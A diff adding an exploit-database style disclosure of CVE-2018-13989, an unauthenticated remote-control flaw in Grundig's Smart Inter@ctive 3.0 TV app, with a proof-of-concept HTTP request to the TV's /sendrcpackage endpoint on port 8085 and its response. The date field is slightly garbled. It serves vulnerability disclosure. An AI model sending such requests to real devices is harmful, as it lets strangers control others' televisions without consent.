@@ -1,0 +1,34 @@
+# Exploit Title: Grundig Smart Inter@ctive 3.0 - Cross-Site Request Forgery
+# Date: 2018-07-§3
+# Exploit Author: Ahmethan-Gultekin - t4rkd3vilz
+# Vendor Homepage: https://www.grundig.com/
+# Software Link: https://play.google.com/store/apps/details?id=arcelik
+# Version: Before > Smart Inter@ctive 3.0
+# Tested on: Kali Linux
+# CVE : CVE-2018-13989
+
+# I'm trying my TV.I saw a Grundig remote control application on
+# Google Play. Computer I downloaded and decompiled APK. 
+# And I began to examine individual classes. I noticed in a class
+# that a request was sent during operations on the command line.
+# I downloaded the phone packet viewer and opened the control application and
+# made some operations. And I saw that there was such a request;
+
+# PoC
+
+request ->
+GET /sendrcpackage?keyid=-2544&keysymbol=-4081 HTTP/1.1
+Host: 192.168.1.106:8085
+Connection : Keep-Alive
+User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)
+
+
+response ->
+HTTP/1.1 200 OK
+Content-Type : text/plain
+
+# Set rc key is handled for key id : -2544 key symbol : -4081
+# The only requirement for the connection between the TV and the application
+# was to have the same IP address. After I made the IP address on the TV 
+# and the phone and the IP address on the computer the same: 
+# I accessed the interface from the 8085 port. Now I could do anything from the computer :)
